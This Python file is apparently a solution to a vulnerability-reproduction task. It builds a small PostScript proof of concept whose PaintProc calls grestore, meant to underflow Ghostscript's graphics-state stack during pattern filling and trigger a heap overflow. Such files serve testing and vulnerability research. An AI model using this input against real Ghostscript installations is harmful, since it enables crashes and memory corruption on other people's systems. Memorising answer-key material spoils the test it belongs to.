import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability exists in Ghostscript's pattern filling mechanism. The code
        that handles pattern rendering performs a `gsave` before executing the
        user-defined `PaintProc` and a `grestore` afterwards. The vulnerability lies
        in the fact that this final `grestore` is performed without checking if the
        graphics state stack has been modified by the PaintProc.

        By supplying a `PaintProc` that itself contains a `grestore` operation,
        we can pop the state that the pattern machinery pushed. This leaves the
        gstate stack with a depth of 0. When the `PaintProc` finishes, the pattern
        machinery attempts its own `grestore`, leading to a stack underflow (since
        the depth is 0), which triggers the heap buffer overflow.

        This PoC constructs a minimal PostScript file that defines a simple uncolored
        tiling pattern with the malicious `PaintProc`. It then sets this pattern and
        draws a small rectangle, which is sufficient to invoke the vulnerable code
        path in the pattern-drawing implementation. The `showpage` command ensures
        that any buffered rendering commands are flushed and executed.
        """
        poc = b"""%!PS
<<
  /PatternType 1
  /PaintType 2
  /BBox [0 0 1 1]
  /XStep 1
  /YStep 1
  /PaintProc { grestore }
>>
makepattern
setpattern
0 0 1 1 rectfill
showpage
"""
        return poc